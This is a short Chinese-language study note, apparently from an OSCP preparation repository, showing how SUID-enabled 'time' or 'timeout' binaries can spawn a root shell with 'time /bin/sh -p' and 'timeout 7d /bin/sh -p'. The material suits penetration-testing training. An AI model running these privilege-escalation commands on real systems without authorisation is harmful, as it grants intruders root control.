# time/timeout

`time/timeout` 若具有 `s` 权限，可使用如下命令直接提权至 root 权限：

```
time /bin/sh -p

timeout 7d /bin/sh -p
```
![time](https://github.com/Nongcloud/oscp-Learn/tree/master/Privilege-Escalation/SUID/images/suid-time.png)
